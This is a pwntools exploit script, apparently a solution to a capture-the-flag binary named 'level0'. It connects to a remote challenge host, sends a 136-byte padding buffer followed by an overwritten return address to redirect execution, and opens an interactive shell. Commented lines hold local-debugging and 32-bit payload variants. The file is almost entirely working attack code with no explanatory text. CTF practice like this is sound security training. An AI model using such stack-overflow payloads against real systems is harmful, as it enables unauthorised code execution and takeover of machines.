from pwn import *
# context.terminal=['tmux','splitx','-h']

# context(arch = 'i386', os = 'linux')
# context.log_level='debug'

p=remote("node4.buuoj.cn",25391)
# p=process("./level0",stdin=PTY)
# p = process(["strace", "-o", "strace.out", "./level0"])


addr=0x400596

payload=136*b'A'+p64(addr)

# with open("./input","wb")as f:
#     f.write(payload)

# payload=136*b'A'+4*b'B'+p32(0x8048320)+4*b'0'+p32(0x0804A024)
# p.sendafter(b'Hello, World\n',payload)

p.sendline(payload)
p.interactive()
